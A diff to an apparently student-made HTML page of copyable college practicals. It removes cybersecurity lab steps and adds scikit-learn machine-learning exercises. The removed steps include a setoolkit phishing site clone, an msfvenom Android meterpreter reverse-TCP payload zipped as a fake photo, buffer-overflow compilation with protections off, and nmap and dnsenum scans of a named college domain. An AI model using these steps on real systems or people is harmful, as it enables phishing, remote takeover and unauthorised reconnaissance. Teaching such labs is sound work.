@@ -37,203 +37,919 @@
 
 <body>
 
-    <button onclick="copyText(text1)">2 setoolkit(sitecloner)</button>
-    <button onclick=" copyText(text2)">3 cupp([password]) </button>
-    <button onclick="copyText(text3)">5 msfvenom </button>
-    <button onclick="copyText(text4)">6 putty () </button>
-    <button onclick="copyText(text5)">7a paritycheck </button>
-    <button onclick="copyText(text6)">7b 2d parity check</button>
-    <button onclick="copyText(text7)">8 buffer flow</button>
-    <button onclick="copyText(text8)">9 zen map tool </button>
-    <button onclick="copyText(text9)">10 ssh telnet</button>
-    <button onclick="copyText(text10)">11 netcraft(website)</button>
-    <button onclick="copyText(text11)">12 implements network tools </button>
-    
+    <button onclick="copyText(text1)">1.Working with Decision tree</button>
+    <button onclick=" copyText(text2)">1b.Rule based model</button>
+    <button onclick="copyText(text3)">1c.Probabilistic Reasoning</button>
+    <button onclick="copyText(text4)">2.Binary classification using logistic regression</button>
+    <button onclick="copyText(text5)">2b.  Implement binary classification Logistic Regression BreastC  </button>
+    <button onclick="copyText(text6)">3 Imbalanced Classification SMOTE and without SMOTE </button>
+    <button onclick="copyText(text7)">3b.Python program for confusion matrix </button>
+    <button onclick="copyText(text8)">3c.probability estimation using logistic regression</button>
+    <button onclick="copyText(text9)">3d.Train a logistic regression model to predict the probability of passing an exam</button>
+    <button onclick="copyText(text10)">3e.Train a multinomial logistic regression model using the Iris dataset </button>
+    <button onclick="copyText(text11)">4.Underfitting using linear regression </button>
+    <button onclick="copyText(text12)">5.Overfitting Code </button>
+    <button onclick="copyText(text13)">6.polynomial regression </button>  
+    <button onclick="copyText(text14)">6b.Stock price prediction using Polynomial Regression</button>
+    <button onclick="copyText(text15)">7a.significance threshold for correlated hypotheses  </button>
+    <button onclick="copyText(text16)">7b.Analyzing Stock Indicators: Moving Averages, Momentum, Volatility </button>
+    <button onclick="copyText(text17)">8.Working with KMeans Clustering  </button>
+    <button onclick="copyText(text18)">9.Hierarchical Clustering  </button>
+    <button onclick="copyText(text19)">10.Apriori Algorithm - Market Basket Analysis</button>
+
+
+   
     <p id="copiedMsg"></p>
     <script>
-        var text1 = `
-        Practical 2 
-1 step ifconfig 
-2step (root) setoolkit
-3step(select all this number ) 1,2,3,2
-4step (ip address input )
-5 step website url = vulnweb
-6step firefox  enter (ip address  and search )
+        var text1 = `1a
+    #import libraries
+from sklearn.datasets import load_iris
+from sklearn.model_selection import train_test_split
+from sklearn.tree import DecisionTreeClassifier
+from sklearn.metrics import accuracy_score
+import matplotlib.pyplot as plt
+from sklearn.tree import plot_tree
+
+
+#Step 2 Load Dataset
+iris=load_iris()
+X=iris.data #Features
+y=iris.target #label
+
+
+#Step 3 Split the data into training and testing sets
+X_train, X_test, y_train, y_test=train_test_split(X, y, test_size=0.2)
+
+
+#Step 4 Initialize the decision tree classifier
+z=DecisionTreeClassifier(max_depth=3, random_state=42)
+z.fit(X_train, y_train)
+
+
+#Step 5 Predict the model(test set)
+y_pred=z.predict(X_test)
+accuracy=accuracy_score(y_test, y_pred)
+print("Accuracy Score: ",accuracy)
+
+
+#Step 6 Visualization
+plt.figure(figsize=(12,8))
+plot_tree(z, feature_names=iris.feature_names, class_names=iris.target_names, filled=True)
+plt.suptitle("Decision Tree ")
+plt.show()
+
+
+
+
 
 
     `;
-        var text2 = `
-        Practical no 3 cupp
-1 step cd
-2step cd cupp 
-3step ./cupp.py -i
-(Fill buy your self )
-4 step nano file name.txt
+        var text2 = `1b
+        # Step 1 Import libraries
+from sklearn.datasets import load_iris
+from sklearn.model_selection import train_test_split
+from sklearn.metrics import accuracy_score
+
+
+#Step 2 Load Iris Dataset
+iris=load_iris()
+X=iris.data #Features
+y=iris.target #label
+
+
+#Step 3 Split the data into training and testing sets
+X_train, X_test, y_train, y_test=train_test_split(X, y, test_size=0.2)
+
+
+#Step 4 Rule Based Classifier Function
+def rule_based_classifier(features):
+  petal_length=features[2]
+  petal_width=features[3]
+  if petal_length<2.5:
+    return 0
+  elif petal_length>1.8:
+    return 1
+  else:
+    return 2
+y_pred=[rule_based_classifier(sample) for sample in X_test]
+
+
+#Evaluate the model
+accuracy = accuracy_score(y_pred,y_test)
+print("Accuracy:", accuracy)
+
+
 
 `;
 
-        var text3 = `
-        Practical 5 
-1 step ifconfig 
-2 step download any apk file 
-3step rename.apk
-4step msfvenom -p android/meterpreter/reverse_tcp Lhost=(your ip address) Lport =4444 (hit enter)
-5step write (cmd in in download)
-7step zip photo.zip app.apk 
+        var text3 = `1c
+        #Import Libraries
+import random
+import numpy as np
+from collections import Counter
+
+
+num_rolls = 100
+die_face = [1,2,3,4,5,6]
+
+
+rolls = [random.choice(die_face) for _ in range(num_rolls)]
+
+
+roll_count = Counter(rolls)
+
+
+probs = {face:count/num_rolls for face, count in roll_count.items()}
+
+
+print("Observed Probabilities:")
+
+
+for face, prob in probs.items():
+  print(f"Probability of {face}: {prob:.2f}")
+
+
+even_face = [2,4,6]
+
+
+even_rolls = sum(roll_count [face] for face in even_face)
+prob_even = even_rolls/num_rolls
+
+
+print(f"\nEven Number probability: {prob_even:.2f}")
+
+
+print(f"Odd Number probability:  {1-prob_even:.2f}")
+
+
+print("\nTheoritical Probabilities")
+theo_prob = {face:1/6 for face in die_face}
+for face, prob in theo_prob.items():
+  print(face, prob)
 
 `;
 
-        var text4 = ` 
-        Practical 6 
-1Step  mkdir ssh 
-2step cd ssh 
-3step nano filename.txt 
-4step enter anything in the file 
-5step service ssh status 
-6step service ssh start (if of)
-7step service ufw status if (start then off it )
-8step then go to putty enter kali ip address and (repeat the first 3 step in putty )
-    
+        var text4 = `2a
+        # step 1 : import required libraries
+import numpy as np
+import pandas as pd
+import matplotlib.pyplot as plt
+import seaborn as sns
+from sklearn.model_selection import train_test_split
+from sklearn.preprocessing import StandardScaler
+from sklearn.linear_model import LogisticRegression
+from sklearn.metrics import accuracy_score,confusion_matrix,classification_report
+
+
+# step 2 : load the dataset {uploading the csv}
+file_path ="diabetes.csv"
+columns = ["Pregnancies","Glucose","BloodPressure","SkinThickness","Insulin","BMI","DiabetesPedigreeFunction","Age","Outcome"]
+df = pd.read_csv(file_path,names= columns)
+
+
+# step 3 : data exploration
+print(df.head()) #first 5 values in table
+print(df.tail()) #last 5 values in table
+print("Dataset info", df.info()) #info will give the missing values, then we can clean the missing values
+
+
+# step 4 : data pre-processing
+df['Pregnancies'] = pd.to_numeric(df['Pregnancies'], errors='coerce')
+# If there are still non-numeric values after conversion, you might choose to drop those rows
+df = df.dropna()
+x = df.drop("Outcome",axis=1)
+y = df["Outcome"]
+x = df.drop("Outcome",axis=1) #this x will have all the features
+y = df["Outcome"]
+
+
+# step 5 : split the tdata in training and testing data 80% &20% respectively
+x_train,x_test,y_train,y_test = train_test_split(x,y,test_size=0.2,random_state=42)
+
+
+# step 6 : standadrize the feauture value- feature transformation
+scaler = StandardScaler()
+x_train = scaler.fit_transform(x_train)
+x_test = scaler.transform(x_test)
+
+
+# step 7: apply the model
+model = LogisticRegression()
+model.fit(x_train,y_train)
+y_pred = model.predict(x_test)
+
+
+# setp 8: Model evaluation
+accuracy = accuracy_score(y_test,y_pred)
+conf_matrix = confusion_matrix(y_test,y_pred)
+class_report = classification_report(y_test,y_pred)
+
+
+# step 9 : Report
+print("Accuracy:",accuracy)
+print("Confusion Matrix:\n",conf_matrix)
+print("Classification Report:\n",class_report)
+
+
+# step 10 : data vizualization
+plt.figure(figsize=(8,6))
+sns.heatmap(conf_matrix,annot=True,fmt="d",cmap="Blues",xticklabels=["No Diabetes","Diabetes"],yticklabels=["No Diabetes","Diabetes"])
+plt.xlabel("Predicted")
+plt.ylabel("Actual")
+plt.title("Confusion Matrix")
+plt.show()
+
+
+   
 `;
 
-        var text5 = `
-        Pract 7 
-print('-----------Name: admin , RollNo: KCFMSCITadmin------------')
-
-def calculate_parity(data: str) -> int:
-    count_of_ones = data.count('1')
-    
-    return 0 if count_of_ones % 2 == 0 else 1
-
-def check_parity(data_with_parity: str) -> bool:
-    data = data_with_parity[:-1]
-    received_parity_bit = int(data_with_parity[-1])
-    calculated_parity_bit = calculate_parity(data)
-    return received_parity_bit == calculated_parity_bit
+        var text5 = `2b
+        import matplotlib.pyplot as plt
+from sklearn.datasets import load_breast_cancer
+dataset = load_breast_cancer(as_frame= True)
+print('Dataset: \n',dataset['data'].head())
+print('Target: \n',dataset['target'].head())
+print('Calculate the count of 0 and 1: \n',dataset['target'].value_counts())
 
 
-user_data = input("Enter a binary string (without the parity bit): ")
-if not set(user_data).issubset({'0', '1'}):
-    print("Invalid input!")
-else:
-    parity_bit = calculate_parity(user_data)
-    print(f"Calculated Parity Bit: {parity_bit}")
-    data_with_parity = user_data + str(parity_bit)
-    print(f"Data with Parity Bit: {data_with_parity}")
-
-    received_data = input("Enter received data with parity bit for integrity check: ")
-    if check_parity(received_data):
-        print("Data is intact.")
-    else:
-        print("Data is corrupted.")
-
-print('-----------Name: admin, RollNo: KCFMSCITadmin------------')
+X = dataset['data']
+y = dataset['target']
 
 
+from sklearn.model_selection import train_test_split
+X_train, X_test, y_train, y_test = train_test_split(X,y,test_size=0.25, random_state=0)
 
-        
+
+#How do we avoid data leakage: by transforming the data using standard scalar
+from sklearn.preprocessing import StandardScaler
+ss = StandardScaler()
+X_train = ss.fit_transform(X_train)
+X_test = ss.transform(X_test)
+
+
+from sklearn.linear_model import LogisticRegression
+lr = LogisticRegression()
+lr.fit(X_train, y_train)
+y_pred = lr.predict(X_test)
+
+
+from sklearn.metrics import accuracy_score
+accuracy = accuracy_score(y_test, y_pred)
+print("Accuracy: ", accuracy)
+
+
+from sklearn.metrics import confusion_matrix
+cn = confusion_matrix(y_test, y_pred)
+tn, fp, fn, tp = confusion_matrix(y_test, y_pred).ravel()
+print("True Negative: ", tn)
+print("False Positive: ", fp)
+print("False Negative: ", fn)
+print("True Positive: ", tp)
+
+
+#Accuracy: (correct_prediction)/(total_no_of_dataset)
+acc = (tn + tp) / (tn+ tp+ fn + fp)
+print("Accuracy (custom): ",acc)
+print("-----Surabhi Maydeo 021------")
+
+
+       
   `;
-  
-        var text6 = ` 
-        practical 7b
-        def two_d_parity_check(data):
-    row_parity = []
-    col_parity = [0] * len(data[0])  
+ 
+        var text6 = `3a
+       #Imbalanced Classification
+#Step 1: Importing libraries
+import numpy as np
+import pandas as pd
+import matplotlib.pyplot as plt
+from sklearn.datasets import make_classification
+from sklearn.model_selection import train_test_split
+from sklearn.ensemble import RandomForestClassifier
+from sklearn.metrics import accuracy_score,confusion_matrix,classification_report
+from imblearn.over_sampling import SMOTE
+
+
+print("------------Before applying SMOTE Technique-------------")
+#Step 2: Creating an imbalance dataset
+X,y = make_classification(n_samples=5000,n_features=10,n_classes=2,weights=[0.95,0.05],random_state=42)
+#check class distribution
+print(pd.Series(y).value_counts(normalize=True))
+
+
+#Step 3: Split the dataset
+X_train,X_test,y_train,y_test = train_test_split(X,y,test_size=0.2,random_state=42)
+
+
+#Step 4: Train the model
+rf = RandomForestClassifier(random_state=42)
+rf.fit(X_train,y_train)
+
+
+#Step 5: Predict the model
+y_pred = rf.predict(X_test)
+
+
+#Step 6: Evaluate the model
+accuracy = accuracy_score(y_test,y_pred)
+conf_matrix = confusion_matrix(y_test,y_pred)
+class_report = classification_report(y_test,y_pred)
+print("Accuracy:",accuracy)
+print("Confusion Matrix:\n",conf_matrix)
+print("Classification Report:\n",class_report)
+
+
+print("-------------Applying SMOTE Technique-------------")
+smote = SMOTE(sampling_strategy='auto',random_state=42)
+X_train_resampled,y_train_resampled = smote.fit_resample(X_train,y_train)
+#Let's check the new class distribution
+print("Resampled dataset:\n", pd.Series(y_train_resampled).value_counts(normalize=True))
+
+
+#Train the model
+rf = RandomForestClassifier(random_state=42)
+rf.fit(X_train_resampled,y_train_resampled)
+
+
+#Predict the model
+y_pred_sample = rf.predict(X_test)
+
+
+#Evaluate the model
+accuracy = accuracy_score(y_test,y_pred_sample)
+conf_matrix = confusion_matrix(y_test,y_pred_sample)
+print("Accuracy:",accuracy)
+print("Confusion Matrix:\n",conf_matrix)
+print("Classification Report:\n",classification_report(y_test,y_pred_sample))
+`;
+
+        var text7 = `3b
+       #Example 1 of confusion matrix
+import seaborn as sns
+import matplotlib.pyplot as plt
+from sklearn.metrics import confusion_matrix
+
+
+#Sample dataset
+y_actual = [1,0,1,1,0,0,1,0,0,1]
+y_predicted = [1,0,0,1,0,0,1,1,0,1]
+
+
+#Lets compute the confusion matrix
+cn = confusion_matrix(y_actual,y_predicted)
+print(cn)
+
+
+#Plotting the confusion matrix
+sns.heatmap(cn,annot=True,fmt='d',cmap='Blues',xticklabels=['Present','Absent'],yticklabels=['Present','Absent'])
+plt.xlabel('Predicted')
+plt.ylabel('Actual')
+plt.title('Confusion Matrix - Surabhi Maydeo')
+plt.show()
+
+
+#Accuracy
+accuracy = (cn[0,0]+cn[1,1])/(cn[0,0]+cn[0,1]+cn[1,0]+cn[1,1])
+print("Accuracy: ",accuracy)
+
+
+#Precision
+precision = cn[1,1]/(cn[0,1]+cn[1,1])
+print("Precision: ",precision)
+
+
+#Recall
+recall = cn[1,1]/(cn[1,0]+cn[1,1])
+print("Recall: ",recall)
+
+
+    `;
+
+    var text8 = `3c
+import numpy as np
+import matplotlib.pyplot as plt
+import seaborn as sns
+from sklearn.linear_model import LogisticRegression
+from sklearn.model_selection import train_test_split
+from sklearn.metrics import accuracy_score, confusion_matrix
+
+
+def logistic_regression_probability_estimation(X, y):
+
+
+    # Split the data into training and testing sets
+    X_train, X_test, y_train, y_test = train_test_split(
+        X, y, test_size=0.2, random_state=42
+    )
+
+
+    # Create and train the logistic regression model
+    model = LogisticRegression()
+    model.fit(X_train, y_train)
+
+
+    # Predict class labels
+    y_pred = model.predict(X_test)
+
+
+    # Calculate accuracy
+    accuracy = accuracy_score(y_test, y_pred)
+    print("Accuracy:", accuracy)
+
+
+    # Calculate confusion matrix
+    cn = confusion_matrix(y_test, y_pred)
+    print("\nConfusion Matrix:\n", cn)
+
+
+    #Plotting the confusion matrix
+    sns.heatmap(cn,annot=True,fmt='d',cmap='Blues',xticklabels=['Negative','Positive'],yticklabels=['Negative','Positive'])
+    plt.xlabel('Predicted')
+    plt.ylabel('Actual')
+    plt.title('Confusion Matrix - Logistic Regression')
+    plt.show()
+
+
+    #Precision
+    precision = cn[1,1]/(cn[0,1]+cn[1,1]) if (cn[0,1]+cn[1,1]) !=0 else 0
+    print("Precision: ",precision)
+
+
+    #Recall
+    recall = cn[1,1]/(cn[1,0]+cn[1,1]) if (cn[1,0]+cn[1,1]) !=0 else 0
+    print("Recall: ",recall)
+
+
+if __name__ == "__main__":
+   
+    np.random.seed(0)
+    X = np.random.randn(100, 2)
+    y = (X[:, 0] + X[:, 1] > 0).astype(int) # Create binary labels
+
+
+    logistic_regression_probability_estimation(X, y)
+
+
+    `;
+    var text9 = ` 3d
+    import numpy as np
+from sklearn.linear_model import LogisticRegression
+
+
+def predict_exam_pass_probability(study_hours, exam_results):
+
+
+    study_hours = np.array(study_hours).reshape(-1, 1)
+    exam_results = np.array(exam_results)
+
+
+    model = LogisticRegression()
+    model.fit(study_hours, exam_results)
+
+
+    return model
+
+
+if __name__ == "__main__":
+    study_hours = [2, 3, 4, 5, 6, 7, 8, 9, 10, 1, 1.5, 2.5]
+    exam_results = [0, 0, 0, 1, 1, 1, 1, 1, 1, 0, 0, 0] # 1 means pass, 0 means fail
+
+
+    model = predict_exam_pass_probability(study_hours, exam_results)
+
+
+    # Predict the probability of passing for a student who studied 4.5 hours
+    new_study_hours = np.array([[4.5]])
+    probability = model.predict_proba(new_study_hours)[0][1] # probability of passing (class 1)
+
+
+    print(f"Probability of passing with 4.5 study hours: {probability:.4f}")
+
+
+    #Predict probability for a student who studied 2 hours
+    new_study_hours_2 = np.array([[2]])
+    probability_2 = model.predict_proba(new_study_hours_2)[0][1]
+    print(f"Probability of passing with 2 study hours: {probability_2:.4f}")
+
+
 
     
-    for row in data:
-        row_parity_bit = sum(row) % 2
-        row_parity.append(row_parity_bit)
-
-        for i, elem in enumerate(row):
-            col_parity[i] ^= elem  
-
-    return row_parity, col_parity
-
-def check_data_integrity(data, row_parity, col_parity):
-    for i, row in enumerate(data):
-        row_parity_bit = sum(row) % 2
-        if row_parity_bit != row_parity[i]:  
-            return False
-
-    for i in range(len(col_parity)):
-        col_parity_bit = sum(row[i] for row in data) % 2
-        if col_parity_bit != col_parity[i]:  
-            return False
-
-    return True
-
-# Example usage:
-data = [
-    [1, 0, 1],
-    [0, 1, 0],
-    [1, 1, 1]
-]
-
-row_parity, col_parity = two_d_parity_check(data)
-print("Row parity:", row_parity)
-print("Column parity:", col_parity)
-
-if check_data_integrity(data, row_parity, col_parity):
-    print("Data is intact.")
-else:
-    print("Data is corrupted.")
-
-
-        
-`;
-
-        var text7 = `
-        Practical 8
-Step 1 nano filename.c
-Step2 code in the file 
-Step 3 for compile gcc -fno-stack-protector -z execstack -o filename  filename.c
-Step4 ./filename
-        
-`;
-var text8 = `
-Practical no 9 (zen map)
-Step1 enter the ip address ipconfig(window)
-Step2 select the intense scan ( in profile)
-Step 3 click on scan 
 
     `;
 
-    var text9 = `
-    practical 10 
-    Step 1 apt-get update 
-Step 2 apt install busybox-static
-Step 3 apt install telnet -y
-Step 4 busybox telnetd -f -p 23
-Step5 open wireshark in linux and double click on (eth0) and inside (eth0 )tcp.port==23
-Step 6 telnet localhost 
-step7 go to statistic from the manu bar at top 
-ssh (part)
-step 1 apt install openssh-server
-step2 systemctl enable ssh
-step3  systemctl status ssh
-step4 systemctl start ssh
-step5 open wireshark in linux and double click on (eth0) and inside (eth0 )tcp.port==22
-step 6 follow tcpstream 
-step7 go to statistic from the manu bar at top
+
+    var text10 = ` 3e
+    import numpy as np
+from sklearn.datasets import load_iris
+from sklearn.model_selection import train_test_split
+from sklearn.linear_model import LogisticRegression
+from sklearn.metrics import accuracy_score
+
+
+def multinomial_logistic_regression_iris():
+
+
+    # Load the Iris dataset
+    iris = load_iris()
+    X = iris.data
+    y = iris.target
+
+
+    # Split the dataset into training and testing sets
+    X_train, X_test, y_train, y_test = train_test_split(
+        X, y, test_size=0.3, random_state=42
+    )
+
+
+    # Create and train the multinomial logistic regression model
+    model = LogisticRegression(multi_class='multinomial', solver='lbfgs', max_iter=1000)
+    model.fit(X_train, y_train)
+
+
+    # Predict class probabilities for the test set
+    probabilities = model.predict_proba(X_test)
+
+
+    # Predict class labels
+    y_pred = model.predict(X_test)
+
+
+    # Calculate accuracy
+    accuracy = accuracy_score(y_test, y_pred)
+
+
+    print("Multinomial Logistic Regression on Iris Dataset:")
+    print("Accuracy:", accuracy)
+    print("\nPredicted Probabilities (first 5 samples):\n", probabilities[:5])
+
+
+    return model, probabilities, accuracy
+
+
+if __name__ == "__main__":
+    multinomial_logistic_regression_iris()
+
+
+    
+    
+
+    `;
+
+    var text11 = ` 4
+    import numpy as np
+import pandas as pd
+import matplotlib.pyplot as plt
+from sklearn.datasets import fetch_openml
+from sklearn.model_selection import train_test_split
+from sklearn.linear_model import LinearRegression
+from sklearn.metrics import mean_squared_error,r2_score
+from sklearn.preprocessing import StandardScaler
+
+
+
+
+#Step 2: load datasets
+boston = fetch_openml(data_id=42165,as_frame=True)
+
+
+x = pd.DataFrame(boston.data,columns=boston.feature_names)
+y = boston.target
+columns = boston.feature_names
+print(x)
+print(x.describe)
+
+
+# Underfitting
+#Step 3: Splitting the data into training and testing data
+x_simple = x[['YrSold']]
+x_train,x_test,y_train,y_test = train_test_split(x_simple,y,test_size=0.2,random_state=42)
+
+
+
+
+#Step 4: Build the model
+model = LinearRegression()
+model.fit(x_train,y_train)
+print("Built the model")
+
+
+
+
+#Step 5: Evaluate the model
+y_pred = model.predict(x_test)
+print("y_pred",y_pred)
+mse = mean_squared_error(y_test,y_pred)
+print("MSE: ",mse)
+r2 = r2_score(y_test,y_pred)
+print("R2: ",r2)
+
+
+
+
+#Step 6: Accuracy (Comparing y_test & y_pred)
+accuracy = r2_score(y_test,y_pred)
+print("Accuracy: ",accuracy)
+
+    
+    
+
+    `;
+
+    var text12 = ` 5
+    print("Overfitting Example")
+import numpy as np
+import pandas as pd
+from sklearn.preprocessing import PolynomialFeatures
+from sklearn.linear_model import LinearRegression
+from sklearn.model_selection import train_test_split
+from sklearn.metrics import mean_squared_error,r2_score
+from sklearn.metrics import accuracy_score
+
+
+#Step 2: Generate the data
+np.random.seed(1)
+x= np.sort(50*np.random.rand(40,1),axis=0)
+y = np.sin(x).ravel()
+y[::5] += 1*(0.5-np.random.rand(8))
+
+
+#Step 3: Split the data into training and testing data
+x_train,x_test,y_train,y_test = train_test_split(x,y,test_size=0.2,random_state=42)
+
+
+#Step 4: Using Polynomial regression
+poly= PolynomialFeatures(degree=15)
+x_train_poly = poly.fit_transform(x_train)
+x_test_poly = poly.transform(x_test)
+y_pred_train = poly.transform(x_test)
+#Step 5: Build model
+model = LinearRegression()
+model.fit(x_train_poly,y_train)
+print("Model is built")
+
+
+#Step 6: Evaluate the model
+y_pred = model.predict(x_test_poly)
+print("y_pred",y_pred)
+mse = mean_squared_error(y_test,y_pred)
+print("MSE: ",mse)
+r2 = r2_score(y_test,y_pred)
+print("R2 on training: ",r2)
+#Step 6: Accuracy (Comparing y_test & y_pred)
+accuracy = r2_score(y_test,y_pred)
+print("Accuracy: ",accuracy)
+
+    
+    
+
+    `;
+
+    var text13 = ` 6a
+    import numpy as np
+import pandas as pd
+import matplotlib.pyplot as plt
+from sklearn.preprocessing import PolynomialFeatures
+from sklearn.linear_model import LinearRegression
+from sklearn.metrics import mean_squared_error, r2_score
+#Step 1 Load Data
+data={"Size":[500,700,900,1100,1300,1500,1700,2000,2500,3000],
+    "Prize":[30,35,50,60,5,85,95,120,150,200]}
+df=pd.DataFrame(data)
+#print("Dataset:\n"df)
+ 
+#Step 2 Extract Feature and Target value
+X=df[['Size']].values
+y=df['Prize'].values
+print(X)
+print(y)
+ 
+#Step 4 Polynomial Regression with degree 2
+poly=PolynomialFeatures(degree=2)
+X_poly=poly.fit_transform(X)
+ 
+#Step 5 Train the Poly Regr Model
+model=LinearRegression()
+model.fit(X_poly,y)
+ 
+#Step 6 Predict Model
+y_pred=model.predict(X_poly)
+ 
+#Step 7 Visualization
+plt.scatter(X,y,color='red',label="Actual Price")
+plt.plot(X,y_pred, color='Blue', label="Preicted value")
+plt.xlabel("Size")
+plt.ylabel("Price")
+plt.title("House Price Prediction using Polynomial regression")
+plt.legend()
+plt.show()
+ 
+mse=mean_squared_error(y,y_pred)
+r2=r2_score(y,y_pred)
+print("Mean Squared error: ", mse)
+print("R2 Score :", r2)
+
+    
+    
+
+    `;
+
+    var text14 = ` 6b
+    from math import degrees
+import numpy as np
+import pandas as pd
+import matplotlib.pyplot as plt
+from sklearn.preprocessing import PolynomialFeatures
+from sklearn.linear_model import LinearRegression
+from sklearn.metrics import mean_squared_error, r2_score
+
+
+#Step 2 Create Dataset
+days=np.array([1,2,3,4,5,6,7,8,9,10])
+price=np.array([100,102,105,103,108,115,117,118,120,123])
+ 
+#Step 3
+degrees=[2,3]
+for degree in degrees:
+  poly=PolynomialFeatures(degree=degrees)
+  x_poly=poly.fit_transform(days.reshape(-1,1))
+  model=LinearRegression()
+  model.fit(x_poly,price)
+  y_pred=model.predict(x_poly)
+  print("Predicted Value:", y_pred)
+ 
+#Step 7 Visualization
+  plt.scatter(days,price,color='red',label="Actual Price")
+  plt.plot(days,y_pred, color='Blue', label="Predicted value")
+  plt.xlabel("Days")
+  plt.ylabel("Price")
+  plt.title(f"Polynomial regression with degree{degree}")
+  plt.grid(True)
+  plt.legend()
+  plt.show()
+ 
+  mse=mean_squared_error(price,y_pred)
+  r2=r2_score(price,y_pred)
+  print("Degree: ", degree)
+  print("Mean Squared error: ", mse)
+  print("R2 Score :", r2)
+
+    
+    
+
+    `;
+
+    var text15 = ` 7a
+    import numpy as np
+import matplotlib.pyplot as plt
+from statsmodels .stats.multitest import multipletests
+np.random.seed(42)
+p_value=np.random.uniform(0,0.1,100)
+total_hypothesis=100
+effective_hypothesis=50
+adjusted_alpha=0.05/effective_hypothesis
+significant=p_value< adjusted_alpha
+_,b,_,_=multipletests(p_value,alpha=0.05,method='bonferroni')
+print("Adjusted alpha with effective hypothesis: ",adjusted_alpha)
+print("No. of significant hypothesis: ",np.sum(significant))
+print("No. of correlation hypothesis using bonferroni: ",np.sum(b<0.05))
+
+    
+    
+
+    `;
+
+    var text16 = ` 7b
+    import pandas as pd
+import yfinance as yf
+import numpy as np
+import matplotlib.pyplot as plt
+from scipy.stats import pearsonr
+from statsmodels.stats.multitest import multipletests
+ 
+stock=yf.download("RELIANCE.NS", start="2023-03-1", end="2023-03-22")
+print("Stock Data:\n",stock)
+ 
+stock['return']=stock['Close'].pct_change().shift(-1)
+print("Return: \n",stock['return'])
+ 
+stock['sma_7']=stock['Close'].rolling(7).mean()
+stock['sma_10']=stock['Close'].rolling(10).mean()
+print("sma_7: \n",stock['sma_7'])
+print("sma_10: \n",stock['sma_10'])
+stock['momentum']=stock['Close']-stock['Close'].shift(10)
+stock['volatility']=stock['return'].rolling(10).std()
+print("Momemtum: \n",stock['momentum'])
+print("Volatility: \n",stock['volatility'])
+ 
+indicators=['sma_7','sma_10','momentum','volatility']
+p_values=[] # Changed variable name to p_values to avoid conflict
+for ind in indicators:
+  valid = stock[[ind,'return']].dropna()
+  corr ,p =pearsonr(valid[ind],valid['return']) # Assigned result to p
+  p_values.append(p) # Appended p to the list
+ 
+p_value=np.array(p_values) # Changed back to p_value for consistency
+ 
+effective_n=4
+adjusted_alpha=0.05/effective_n
+significant=p_value< adjusted_alpha
+_,b,_,_=multipletests(p_value,alpha=0.05,method='bonferroni')
+print("Adjusted alpha with effective hypothesis: ",adjusted_alpha)
+print("Number of significant hypothesis: ",np.sum(significant))
+print("No. of correlation hypothesis using bonferroni: ",np.sum(b<0.05))
+result=pd.DataFrame({'indicators':indicators,
+                    'p_value':p_value,
+                    'significant':significant,
+                    'bonferroni':b<0.05})
+print(result)
+
+    
+    
+
+    `;
+
+    var text17 = ` 8a
+    #Working with kmeans clustering
+import numpy as np
+import pandas as pd
+import matplotlib.pyplot as plt
+from sklearn.cluster import KMeans
+from sklearn.datasets import load_iris
+from sklearn.preprocessing import StandardScaler
+iris = load_iris()
+X = iris.data
+y = iris.target
+print(iris)
+print(X)
+scaler = StandardScaler()
+X1 = scaler.fit_transform(X)
+#applying kmeans clustering
+k1 = KMeans(n_clusters=3, random_state=42)
+y_kmeans =KMeans.fit_predict(k1,X1)
+print(y_kmeans)
+plt.scatter(X1[:,0],X1[:,1],c=y_kmeans,cmap='viridis', edgecolors='k')
+plt.scatter(k1.cluster_centers_[:,0],k1.cluster_centers_[:,1], s=200, c='red', marker='X', label = 'centroid')
+plt.xlabel('sepal length (cm)')
+plt.ylabel('sepal width (cm)')
+plt.legend()
+plt.show()
+
+    
+    
+
+    `;
+
+    var text18 = ` 9
+    #Heirarchial clustering
+import numpy as np
+import matplotlib.pyplot as plt
+import seaborn as sns
+from sklearn import datasets
+from sklearn.preprocessing import StandardScaler
+from scipy.cluster.hierarchy import linkage, dendrogram
+from sklearn.cluster import AgglomerativeClustering
+iris=datasets.load_iris()
+X=iris.data[:,:2]
+y=iris.target
+s1 = StandardScaler()
+X1 = s1.fit_transform(X)
+l1 = linkage(X1 , method = 'ward')
+plt.figure(figsize=(8,5))
+dendrogram(l1)
+plt.title(' Dendrogram')
+plt.xlabel('Data Points')
+plt.ylabel('Euclidean Distance')
+plt.show()
+
+    
+    
+
+    `;
+
+    var text19 = ` 10
+    import pandas as pd
+from mlxtend.frequent_patterns import apriori, association_rules
+data = [['Milk', 'Bread', 'Butter'], ['Bread', 'Butter', 'Eggs'], ['Milk', 'Bread', 'Eggs'], ['Milk', 'Eggs'], ['Bread', 'Butter']]
+df = pd.DataFrame(data)
+#print("Dataset: \n",df)
+basket = df.apply(lambda x: pd.Series(x.dropna().values), axis=1).stack().reset_index(level=1, drop=True).to_frame('Item')
+basket['Transaction'] = basket.index
+#print("Basket: \n",basket)
+#print("\n")
+#print(basket['Transaction'])
+basket = basket.pivot_table(index='Transaction', columns='Item', aggfunc=lambda x:1, fill_value=0)
+print("Basket: \n",basket)
+print("\n")
+frequent_item = apriori(basket, min_support=0.4, use_colnames=True)
+print("frequent_item: \n",frequent_item)
+print("\n")
+rules = association_rules(frequent_item, metric='lift', min_threshold=1)
+print("Rules: \n",rules)
+
 
 
     `;
-    var text10 = ` 
-    practical no 11 (use netcraft site )
-(do it by your self inta spoon feading nahi karunga khud se karo )
 
-    `;
-    var text11 = `
-    practical no 12
-step 1 whois kccollege.edu.in
-step2 nslookup kccollege.edu.in
-step3 namp -sV ip address whuch u got in 2 step 
-step4 dnsenum kccollege.edu.in
-step 5 apt-get install bmon 
-step 6 bmon 
-
-    `;
+   
 
 function copyText(text) {
     navigator.clipboard.writeText(text).then(function () {
